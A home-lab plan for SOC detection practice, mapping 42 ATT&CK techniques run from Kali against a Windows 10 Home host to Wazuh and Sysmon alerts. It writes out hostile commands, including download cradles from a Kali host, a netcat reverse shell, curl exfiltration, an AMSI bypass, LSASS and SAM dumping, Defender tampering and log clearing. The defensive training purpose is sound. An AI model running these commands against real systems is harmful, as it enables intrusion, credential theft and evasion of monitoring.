# Kali → Windows 10 Home — All Possible SOC Cases (pre-DC)

Lab: Kali `192.168.100.107` → Windows 10 Home `192.168.100.108`, detected by Wazuh SIEM `192.168.100.102`. No Active Directory yet — everything uses **local accounts** on the Windows Home box.

## Windows Home prerequisites (enable once, snapshot)

On `winhome01` (PowerShell as admin):

```powershell
# 1. Enable File & Printer Sharing (SMB server) — required for brute-force / PtH / remote exec cases
Set-NetFirewallRule -DisplayGroup "File And Printer Sharing" -Enabled True
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force   # keep SMBv1 off; document as hardening

# 2. Enable administrative shares (ADMIN$ / C$) so impacket psexec/wmiexec work
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f

# 3. (Optional) Enable WinRM for evil-winrm cases
winrm quickconfig -force
Enable-PSRemoting -Force
Set-Item WSMan:\localhost\Client\TrustedHosts -Value "192.168.100.107" -Force

# 4. Create weak local accounts (brute-force targets)
net user jdoe "Password1" /add
net user mreyes "rockyou" /add
net user adminlab "P@ssw0rd" /add
net localgroup Administrators adminlab /add   # one local admin for PtH / privesc cases

# 5. Wazuh agent + Sysmon already installed (see 03-Wazuh-SIEM-Deployment.md)
# 6. Snapshot: winhome01-baseline-clean
```

> Defender: leave real-time protection ON. For cases that need mimikatz/procdump, add a lab-only exclusion folder (`C:\tools`) and stage tools there — document the exclusion as a defender-evasion lesson. Never disable Defender entirely; detecting its tampering is itself a case.

## Legend

- **Priv:** `user` = standard local user, `admin` = local admin, `SYSTEM` = needs SYSTEM context
- **Det:** key Wazuh / Windows Event IDs that fire (alerts + archives)
- ✅ = maps to one of your existing Week-1 folders; ⚠️ = needs adjustment; ❌ = not possible on Home

---

## Phase 1 — Reconnaissance (no credentials yet)

| # | Case | ATT&CK | Priv | Attack (Kali) | Detection |
|---|---|---|---|---|---|
| 1 | Port & service scan | T1046 | — | `nmap -sS -sV -O 192.168.100.108` | Windows Firewall dropped-packet logs, many 4625? no — connection attempts; Wazuh archives show repeated failed SYN |
| 2 | SMB share enumeration | T1135 | — | `smbclient -L //192.168.100.108 -U guest`, `enum4linux-ng` | SMB session logon events (4624 type 3 / 4625 failures), Sysmon EID 3 network |
| 3 | Local user enumeration via SMB/RPC | T1087.001 | — | `rpcclient -U "" 192.168.100.108` → `enumdomusers`, `impacket-lookupsid` | 4624/4625 logon events, Wazuh rule for user enumeration |

## Phase 2 — Initial Access

| # | Case | ATT&CK | Priv | Attack (Kali) | Detection |
|---|---|---|---|---|---|
| 4 | ✅ **SMB Brute Force** | T1110.001 | — | `hydra -L users.txt -P rockyou.txt smb://192.168.100.108`, `netexec smb .108 -u users -p rockyou` | Many 4625 failures → Wazuh "authentication failure" rule, then 4624 success; archives show every attempt |
| 5 | ✅ **Password Spraying** | T1110.003 | — | `netexec smb .108 -u users.txt -p 'Winter2024!'` (one pass, low lockout) | 4625 spread across accounts (not concentrated), Wazuh spray detection |
| 6 | Phishing macro document | T1566.001 | user | Kali hosts `.docm` (macro → PowerShell reverse shell); user opens on Home | Sysmon EID 1 WINWORD→powershell, Office EID, AMSI EID 1116 |
| 7 | Malicious LNK / ISO shortcut | T1204/T1566.001 | user | Kali hosts `.lnk`/`.iso` that pops `cmd`/PowerShell; user double-clicks | Sysmon EID 1 explorer→cmd/powershell, archive JSON full command line |
| 8 | HTA delivery (mshta) | T1218.005 | user | `msfvenom -p hta`, Kali serves `.hta`, user opens via browser | Sysmon EID 1 mshta.exe spawn, network callback to Kali |
| 9 | ❌ RDP brute force / RDP investigation | — | — | **Not possible** — Home has no incoming RDP. Defer to DC (.109) or replace with case #4/#10 | — |

## Phase 3 — Remote Execution / Lateral (with creds or hash)

| # | Case | ATT&CK | Priv | Attack (Kali) | Detection |
|---|---|---|---|---|---|
| 10 | WinRM brute force / evil-winrm shell | T1021.006 | —→admin | `hydra winrm`, then `evil-winrm -i .108 -u adminlab -p 'P@ssw0rd'` | WinRM 4688 wsmprovhost.exe, Wazuh WinRM rules, archives |
| 11 | Pass-the-Hash (local admin) | T1550.002 | hash→admin | `impacket-psexec -hashes :<NTLM> adminlab@.108`, `impacket-wmiexec`, `impacket-smbexec` | 4624 logon type 3 with NTLM, psexec service install EID 7045, wmiprvse.exe spawn |
| 12 | WMI remote command execution | T1047 | admin | `impacket-wmiexec adminlab@.108 "whoami"` | WMI-Activity EID 5858/5859, wmiprvse.exe child processes |

## Phase 4 — Execution on host (payload staged from Kali)

| # | Case | ATT&CK | Priv | Attack | Detection |
|---|---|---|---|---|---|
| 13 | ✅ **Suspicious PowerShell** (encoded / IEX cradle / AMSI bypass) | T1059.001 | user | `powershell -enc <base64>`, `IEX (New-Object Net.WebClient).DownloadString('http://kali/shell.ps1')` | PowerShell 4103/4104 script-block logging, Sysmon EID 1, AMSI 1116 |
| 14 | LOLBins (certutil / bitsadmin / regsvr32 / rundll32 / mshta / cmstp) | T1218 | user | `certutil -urlcache -split -f http://kali/payload.exe`, `bitsadmin /transfer`, `regsvr32 /s /u /i:http://kali/scrobj.dll scrobj.dll` | Sysmon EID 1 with LOLBin parent, Wazuh LOLBAS rules, network EID 3 to Kali |
| 15 | Meterpreter reverse shell | T1059/T1071 | user | `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=.107 → exe`, handler on Kali | Sysmon EID 3 outbound to Kali:4444, Wazuh network alert, archives |
| 16 | Batch / VBS / JS script execution | T1059.003/.005 | user | `.bat`/`.vbs` dropped and run | Sysmon EID 1 wscript/cscript/cmd, command line in archives |

## Phase 5 — Persistence

| # | Case | ATT&CK | Priv | Attack | Detection |
|---|---|---|---|---|---|
| 17 | ✅ **Scheduled Task creation** | T1053.005 | user/admin | `schtasks /create /tn "UpdateTask" /tr "powershell -enc ..." /sc minute /mo 5` | TaskScheduler EID 106/140, Wazuh scheduled-task rule, Sysmon EID 1 schtasks |
| 18 | Registry Run key | T1547.001 | user | `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d "C:\tools\backdoor.exe"` | Sysmon EID 12/13 registry set, Wazuh registry rule |
| 19 | Startup folder drop | T1547.001 | user | drop `.lnk`/`.bat` in `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` | Sysmon EID 11 file create, Wazuh FIM alert on Startup dir |
| 20 | ✅ **Service creation** (moved from Week 2 — works on Home) | T1543.003 | admin | `sc.exe create EvilSvc binPath= "C:\tools\payload.exe" start= auto`, `New-Service` | System EID 7045 service install, Wazuh rule |
| 21 | WMI permanent event subscription | T1546.003 | admin | `mofcomp` / PowerShell `Register-WmiEvent` on process start | WMI-Activity EID 5861, Wazuh WMI persistence rule |

## Phase 6 — Privilege Escalation (user → admin → SYSTEM)

| # | Case | ATT&CK | Priv | Attack | Detection |
|---|---|---|---|---|---|
| 22 | UAC bypass (fodhelper / computerdefaults) | T1548.002 | user | registry hijack `HKCU\...\ms-settings\shell\open\command` → fodhelper.exe | Sysmon EID 1 fodhelper→cmd/powershell high integrity, Wazuh UAC rule |
| 23 | AlwaysInstallElevated MSI | T1546.016 | user | set two registry keys (lab), `msfvenom -f msi`, `msiexec /q /i evil.msi` → SYSTEM | Sysmon EID 1 msiexec, EID 7045, Wazuh rule |
| 24 | Unquoted service path / weak service perms | T1574.009 | user→admin | plant `C:\Program Files\Evil.exe` in unquoted path, restart service | Sysmon EID 1 service binary spawn, 7045/7034 |
| 25 | Token impersonation / Potato (PrintSpoofer) | T1134 | service→SYSTEM | from service-shell (psexec service runs as SYSTEM) or `PrintSpoofer64.exe -i -c cmd` | Sysmon EID 1 parent services.exe→cmd as SYSTEM, Wazuh token theft rule |
| 26 | ✅ **Account Creation** (local) | T1136.001 | admin | `net user backdoor P@ss /add && net localgroup Administrators backdoor /add` | Security EID 4720/4732, Wazuh account-creation rule |

## Phase 7 — Credential Access

| # | Case | ATT&CK | Priv | Attack | Detection |
|---|---|---|---|---|---|
| 27 | LSASS memory dump (comsvcs.dll / procdump) | T1003.001 | admin | `rundll32 comsvcs.dll,MiniDump <lsass-pid> C:\tools\lsass.dmp full` or procdump | Sysmon EID 10 process access to lsass.exe, Wazuh credential-access rule, Defender alert |
| 28 | SAM + SYSTEM hive dump → offline crack on Kali | T1003.002 | admin | `reg save HKLM\SAM sam`, `reg save HKLM\SYSTEM system` → `impacket-secretsdump -sam sam -system system LOCAL` on Kali → `hashcat -m 1000` | Sysmon EID 1 reg.exe, Wazuh registry-hive dump rule |
| 29 | Mimikatz sekurlsa (in-memory) | T1003 | admin | stage mimikatz in excluded `C:\tools`, `sekurlsa::logonpasswords` | Same as #27 + Defender AMSI; document evasion |
| 30 | Credential phishing (fake login prompt) | T1056.002 | user | PowerShell pop-up credential box, send creds to Kali | PowerShell 4104 logging of prompt script |
| 31 | Browser credential / cookie dump | T1555.003 | user/admin | mimikatz `dpapi::chrome` / SharpChrome → exfil to Kali | Sysmon EID 11 file read of Chrome Login Data |

## Phase 8 — Defense Evasion

| # | Case | ATT&CK | Priv | Attack | Detection |
|---|---|---|---|---|---|
| 32 | AMSI bypass | T1562.001 | user | `[Ref].Assembly.GetType(...).GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)` | PowerShell 4104, AMSI 1116 if failed, Wazuh rule on bypass strings |
| 33 | Defender tampering / exclusion | T1562.001 | admin | `Set-MpPreference -ExclusionPath C:\tools -DisableRealtimeMonitoring $true` | Defender operational log EID 5007, Wazuh defender-tamper rule |
| 34 | Windows Event Log clearing | T1070.001 | admin | `wevtutil cl Security`, `Clear-EventLog` | **Wazuh fires immediately on log-clear event** (EID 1102), plus gap in archive stream |
| 35 | PowerShell obfuscation (Invoke-Obfuscation) | T1027 | user | obfuscate download cradle, run on Home | PowerShell 4104 (still logs obfuscated text), Wazuh suspicious-PS rule |

## Phase 9 — C2 / Exfiltration

| # | Case | ATT&CK | Priv | Attack | Detection |
|---|---|---|---|---|---|
| 36 | Reverse-shell C2 traffic | T1071 | user | meterpreter / `nc.exe -e cmd` to Kali | Sysmon EID 3 outbound to non-standard port, Wazuh network rule, archives |
| 37 | DNS tunneling (dnscat2) | T1071.004 | user | dnscat2 client on Home → dnscat2 server on Kali | Sysmon EID 22 DNS queries with long subdomains, Wazuh DNS alert |
| 38 | Data exfiltration (compress + curl) | T1041/T1002 | user | `Compress-Archive C:\Users\*.docx exfil.zip; curl -F file=@exfil.zip http://kali/upload` | Sysmon EID 11 archive create, EID 3 large outbound POST, Wazuh exfil rule |
| 39 | Suspicious DNS lookups (DGA-style) | T1071.004 | user | script that resolves random domains to Kali DNS listener | Sysmon EID 22, Wazuh DNS anomaly |

## Phase 10 — Collection / Impact (lab-only)

| # | Case | ATT&CK | Priv | Attack | Detection |
|---|---|---|---|---|---|
| 40 | File collection & archiving | T1005 | user | `7z a collect.7z C:\Users\jdoe\Documents` | Sysmon EID 1 7z.exe, EID 11 archive create |
| 41 | Keylogger / screen capture | T1056.001/T1113 | user | PowerShell keylogger / `Copy-Screen` → exfil to Kali | PowerShell 4104, EID 11 screenshot file |
| 42 | Ransomware simulation (contained folder) | T1486 | user | encrypt files in `C:\lab-ransom\` only with AES, leave note | Mass Sysmon EID 11 file rename/modify, Wazuh FIM flood, Defender alert |

---

## Mapping to your existing WEEK-1 folders

| Your Week-1 folder | Status on Home | What to do |
|---|---|---|
| SOC-Case-Brute-Force | ✅ works | Target SMB (445) on winhome01 with hydra/netexec |
| SOC-Case-Password-Spraying | ✅ works | Spray one password across local accounts (jdoe, mreyes, adminlab) via SMB |
| SOC-Case-Suspicious-PowerShell | ✅ works | IEX download cradle + encoded command + AMSI bypass |
| SOC-Case-Scheduled-Task | ✅ works | `schtasks /create` with PowerShell action |
| SOC-Case-Account-Creation | ✅ works | `net user` local account + add to Administrators |
| SOC-Case-RDP-Investigation | ❌ no incoming RDP on Home | **Replace** with "SMB/WinRM Brute-Force Investigation" OR defer RDP to when DC is up (RDP to dc01). Option: document RDP *client* outbound from Home to Kali (xrdp) as a lateral case. |

## Recommended build order (Kali → WinHome, before DC)

1. **Brute Force** (case #4) — easiest, teaches 4625/4624 + Wazuh alerts
2. **Password Spray** (#5) — contrast with brute force
3. **Suspicious PowerShell** (#13) — download cradle, script-block logging
4. **Scheduled Task** (#17) — persistence
5. **Account Creation** (#26) — local admin backdoor
6. **LOLBins** (#14) — certutil / regsvr32
7. **Meterpreter / Reverse Shell** (#15) — C2 telemetry
8. **Pass-the-Hash** (#11) — needs case #28 first (dump hashes)
9. **LSASS / SAM dump** (#27/#28) — credential access
10. **Event Log Clearing** (#34) — Wazuh detects it instantly, great demo
11. **UAC Bypass** (#22) — privilege escalation
12. **Defender Tampering** (#33) — defense evasion

Each case folder should contain: `README.md` (scenario, ATT&CK, attack steps), `attack-commands.txt`, `wazuh-alerts.md` (rule IDs fired, event IDs), `screenshots/` (Kali attack, Wazuh alert, Wazuh archive JSON, mitigation).

## Screenshot pattern (same for every case)

1. Kali terminal — attack command + output
2. Wazuh Dashboard — Security Events → the fired alert (expand to show full JSON)
3. Wazuh Dashboard — Discover → `wazuh-archives-*` → the raw event (shows non-alerted telemetry)
4. (If applicable) Windows side — `eventvwr.msc` showing the raw Event ID
5. Mitigation / detection engineering — the custom Wazuh rule or Sigma rule you wrote
